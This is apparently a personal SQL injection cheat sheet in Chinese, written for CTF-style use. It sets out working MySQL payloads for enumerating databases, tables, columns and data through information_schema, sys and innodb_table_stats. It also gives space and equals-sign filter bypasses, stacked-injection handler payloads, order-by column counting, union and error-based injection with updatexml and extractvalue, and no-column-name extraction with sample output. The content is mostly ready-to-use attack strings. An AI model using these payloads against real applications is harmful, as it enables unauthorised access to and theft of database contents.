# SQli

常规方法利用information_schema

```sql
#爆库
select database()
#爆表
select group_concat(table_name) from information_schema.tables where table_schema=<database name>
#爆字段
select group_concat(column_name) from information_schema.columns where table_name=<table name>
#爆数据
select group_concat(<column name>) from <table name>
```

mysql > 5.6 版本 利用sys库

```sql
# 爆表
# schema_auto_increment_columns

select group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+

# schema_table_statistics_with_buffer

select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
```

mysql > 5.5 利用``innodb_table_stats``

```sql
# 爆表
select group_concat(table_name) from mysql.innodb_table_stats
```

## 技巧

- 加``()、/**/`` bypass``空格``

- ``like`` bypass ``=``

- ``select .`` bypass 一般是堆叠注入

  利用set

  利用handler 

  ```
  1';handler `FlagHere` open;handler `FlagHere` read first;#
  ```

- 看回显点

  ```
  select 1,2,3,....
  ```

- 注释符

  - /**/
  - \# -> %23

  - -- 

- order by看字段数 先看看有几个回显点也可以用group by

  ```
  1' order by 3#
  ->
  
  1' order by 4#
  ->
  Error
  ```

- Union 联合注入

- limit

  ```
  limit i,n
  # tableName：表名
  # i：为查询结果的索引值(默认从0开始)，当i=0时可省略i
  # n：为查询结果返回的数量
  # i与n之间使用英文逗号","隔开
  ```

- 报错注入

  - ``updatexml(1,concat(1,(<SQLi>)),1)``
  - ``extractvalue(1,concat(1,<SQli>))``

- 无列名注入
  考虑这样的表格，使用select 1,2,3,4,5 union select * from persons可以得到一张新的表格

  ```
  MariaDB [test]> select * from persons;
  +------+----------+-----------+--------------+--------+
  | ID   | LastName | FirstName | Address      | Credit |
  +------+----------+-----------+--------------+--------+
  |    1 | Gates    | Bill      | Xuanwumen 10 |   NULL |
  |    1 | Gates    | Bill      | Xuanwumen 10 |   NULL |
  |    2 | Xill     | Hiler     | Like 10      | 100.67 |
  |    2 | Eki      | Hiler     | Nanfen 10    | 100.67 |
  +------+----------+-----------+--------------+--------+
  
  ->
  
  MariaDB [test]> select 1,2,3,4,5 union select * from persons;
  +------+-------+-------+--------------+--------+
  | 1    | 2     | 3     | 4            | 5      |
  +------+-------+-------+--------------+--------+
  |    1 | 2     | 3     | 4            |      5 |
  |    1 | Gates | Bill  | Xuanwumen 10 |   NULL |
  |    2 | Xill  | Hiler | Like 10      | 100.67 |
  |    2 | Eki   | Hiler | Nanfen 10    | 100.67 |
  +------+-------+-------+--------------+--------+
  ```

  然后就可以套娃拿数据了,注意``a``这个别名(任意内容)是必须的（新生成的表）

  ```
  MariaDB [test]> select `2` from (select 1,2,3,4,5 union select * from persons)a;          
  +-------+
  | 2     |
  +-------+
  | 2     |
  | Gates |
  | Xill  |
  | Eki   |
  +-------+
  ```

  或者也可以将数字换成别名 在反引号不可用的情况下

  ```
  MariaDB [test]> select b from (select 1,2 as b,3,4,5 union select * from persons)a;
  +-------+
  | b     |
  +-------+
  | 2     |
  | Gates |
  | Xill  |
  | Eki   |
  +-------+
  ```
